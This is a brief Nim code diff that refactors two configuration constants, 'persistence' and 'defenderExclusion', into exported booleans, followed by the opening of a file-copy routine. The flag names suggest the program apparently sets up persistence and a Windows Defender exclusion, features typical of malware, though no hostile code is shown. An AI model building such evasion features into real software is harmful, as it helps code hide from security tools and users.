@@ -1,10 +1,10 @@
 import os, osproc, strutils
 
-const
-  persistence = "true"
-  defenderExclusion = "true"
-  startUp = persistence.parseBool
-  exclusion = defenderExclusion.parseBool
+const persistence* = "true"
+const defenderExclusion* = "true"
+
+const startUp = persistence.parseBool
+const exclusion = defenderExclusion.parseBool
 
 proc copyFile(src, dst: string): bool =
   try:
